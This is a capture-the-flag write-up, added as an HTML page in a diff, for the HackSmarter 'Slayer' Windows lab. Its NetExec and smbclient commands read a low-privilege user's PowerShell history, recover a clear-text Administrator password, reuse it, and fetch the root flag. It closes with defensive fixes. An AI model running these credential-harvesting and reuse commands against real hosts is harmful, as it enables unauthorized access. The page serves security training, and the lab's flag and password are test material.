@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackSmarter Slayer (Easy): PowerShell history to Administrator</title>
+<style>
+  :root {
+    --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
+    --accent: #ef3257; --good: #5ddea8; --code: #1a2433; --border: #243246;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+    background: var(--bg); color: var(--text); line-height: 1.65; font-size: 16px;
+  }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
+  h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
+  .muted { color: var(--muted); }
+  .hero {
+    background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
+    border: 1px solid var(--border); border-radius: 16px; padding: 28px; margin-bottom: 2rem;
+  }
+  .pill {
+    display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
+    border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
+    padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; letter-spacing: 0.03em;
+    text-transform: uppercase;
+  }
+  table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+  table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
+  table.meta td:first-child { color: var(--muted); width: 28%; }
+  pre {
+    background: var(--code); border: 1px solid var(--border); border-radius: 10px;
+    padding: 14px 16px; overflow-x: auto; font-size: 0.84rem; line-height: 1.5;
+  }
+  code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; color: #c9e4ff; }
+  figure {
+    margin: 1.5rem 0; background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; padding: 10px; overflow: hidden;
+  }
+  figure img { max-width: 100%; height: auto; display: block; border-radius: 8px; }
+  figcaption { color: var(--muted); font-size: 0.88rem; margin-top: 0.6rem; padding: 0 4px; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
+  ul { padding-left: 1.2rem; }
+  a { color: #7cb8ff; }
+  footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="hero">
+  <span class="pill">HackSmarter · Windows · Easy</span>
+  <h1>Slayer: PowerShell history password to Administrator</h1>
+  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Solved 2026-08-06.</p>
+</div>
+
+<table class="meta">
+  <tr><td>Box</td><td>Slayer</td></tr>
+  <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
+  <tr><td>Type</td><td>Windows privilege rise from stored commands</td></tr>
+  <tr><td>Fault</td><td>Clear admin password in PSReadLine history</td></tr>
+  <tr><td>Level</td><td>Easy</td></tr>
+  <tr><td>Target</td><td><code>10.1.176.119</code> host <code>EC2AMAZ-M1LFCNO</code></td></tr>
+  <tr><td>Result</td><td>Admin and root flag on Desktop</td></tr>
+</table>
+
+<h2>What you need to know</h2>
+<ul>
+  <li>Local Windows accounts and NTLM over SMB and RDP</li>
+  <li>NetExec to prove passwords and run remote commands</li>
+  <li>Where PowerShell stores history (PSReadLine)</li>
+  <li>Why history files matter on shared or handed workstations</li>
+</ul>
+
+<h2>Main idea</h2>
+<p>
+If a low rights user can read PowerShell history, any
+<code>net user Administrator …</code> line becomes a ready password for privilege rise.
+</p>
+
+<h2>Story</h2>
+<p>
+You get <code>tyler.ramsey</code> after social engineering. The host is a single Windows box.
+SMB and RDP work. WinRM is filtered. The win is not a potato exploit.
+It is reading shell history and reusing a password.
+</p>
+
+<h2>Why it works</h2>
+<p>
+Someone ran <code>net user administrator "…"</code> in a PowerShell session that wrote to tyler history.
+Windows stored that line in clear text. The password still worked as local Administrator.
+</p>
+
+<pre>Client (Kali)
+   │  tyler.ramsey:P@ssw0rd!
+   ▼
+SMB 445 / RDP 3389  →  tyler (low rights)
+   │
+   │  read ConsoleHost_history.txt
+   ▼
+Administrator password
+   │
+   ▼
+C$\Users\Administrator\Desktop\root.txt</pre>
+
+<h3>Step 1: Reach the host and map ports</h3>
+<div class="why"><strong>Why:</strong> Confirm VPN and which remote paths you can use.</div>
+<pre>ping -c 1 10.1.176.119
+nmap -Pn -n --top-ports 100 -T4 10.1.176.119</pre>
+<p><strong>Expect:</strong> host up. Ports 135, 445, 3389 open. WinRM filtered.</p>
+
+<h3>Step 2: Prove the handed password</h3>
+<div class="why"><strong>Why:</strong> A handed password only helps if SMB or RDP still accepts it.</div>
+<pre>nxc smb 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth
+nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth</pre>
+<p><strong>Expect:</strong> host <code>EC2AMAZ-M1LFCNO</code>, auth OK, no admin shares for tyler.</p>
+
+<figure>
+  <img src="images/01-user-desktop.png" alt="RDP as tyler.ramsey" />
+  <figcaption>Figure 1. RDP as tyler.ramsey.</figcaption>
+</figure>
+
+<h3>Step 3: Identity snapshot</h3>
+<div class="why"><strong>Why:</strong> Know groups and rights before you pick a rise path.</div>
+<pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'whoami /all'</pre>
+<p><strong>Expect:</strong> Remote Desktop Users, Users, Performance Log Users. Low privileges. Medium integrity.</p>
+
+<h3>Step 4: List user homes</h3>
+<div class="why"><strong>Why:</strong> Other profiles mean other secrets or accounts.</div>
+<pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'dir C:\Users'</pre>
+<p><strong>Expect:</strong> Administrator, alice.wonderland, Public, tyler.ramsey.</p>
+
+<h3>Step 5: Read PowerShell history</h3>
+<div class="why"><strong>Why:</strong> Interactive shells leave plain text history under the user profile.</div>
+<pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth \
+  -x 'type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'</pre>
+<p><strong>Expect</strong> a line like:</p>
+<pre>net user administrator "ebz0yxy3txh9BDE*yeh"</pre>
+
+<h3>Step 6: Log on as Administrator</h3>
+<div class="why"><strong>Why:</strong> Reuse the password. If it still works, you own the box.</div>
+<pre>nxc smb 10.1.176.119 -u Administrator -p 'ebz0yxy3txh9BDE*yeh' --local-auth
+# expect: (Pwn3d!)</pre>
+
+<figure>
+  <img src="images/02-admin-desktop.png" alt="RDP as Administrator" />
+  <figcaption>Figure 2. RDP as Administrator after history reuse.</figcaption>
+</figure>
+
+<h3>Step 7: Read the root flag</h3>
+<div class="why"><strong>Why:</strong> Lab goal. Flag sits on the admin Desktop.</div>
+<pre>smbclient //10.1.176.119/C$ -U 'Administrator%ebz0yxy3txh9BDE*yeh' \
+  -c 'get Users\Administrator\Desktop\root.txt root.txt'
+cat root.txt</pre>
+<div class="flag">3835538c50e819f392144ae9ef125496</div>
+
+<h2>Impact</h2>
+<ul>
+  <li>Full local rise from one handed user</li>
+  <li>Clear admin password recovered from disk</li>
+  <li>Path is file read plus auth only</li>
+</ul>
+
+<h2>Fix</h2>
+<ul>
+  <li>Do not set Administrator passwords from a low rights interactive shell.</li>
+  <li>Clear or turn off PSReadLine history on shared and VDI images.</li>
+  <li>Use LAPS or equal for local admin secrets. Rotate after use.</li>
+  <li>Watch password change events and readers of <code>ConsoleHost_history.txt</code>.</li>
+  <li>Segment RDP. Use MFA on real bastions.</li>
+</ul>
+
+<h2>Extra notes</h2>
+<ul>
+  <li>If history is wiped, hunt transcripts, scripts, browser stores, DPAPI.</li>
+  <li>If RDP is closed, map more ports for WinRM or other shells.</li>
+  <li>If the password rotated, move to classic service and task abuse.</li>
+  <li>Ops: <code>~/htb/slayer/ATTACK_LOG.md</code>, loot, screenshots</li>
+</ul>
+
+<h2>Close</h2>
+<p>
+Slayer rewards post foothold hygiene. The exploit is reading a file you already own
+and reusing a password that must not live in shell history.
+</p>
+
+<footer>
+  <p>Authorized training only. Do not use these steps without permission.</p>
+  <p><a href="../../../">mccleod1290.github.io</a> · <a href="../../">HackSmarter labs</a></p>
+</footer>
+
+</div>
+</body>
+</html>
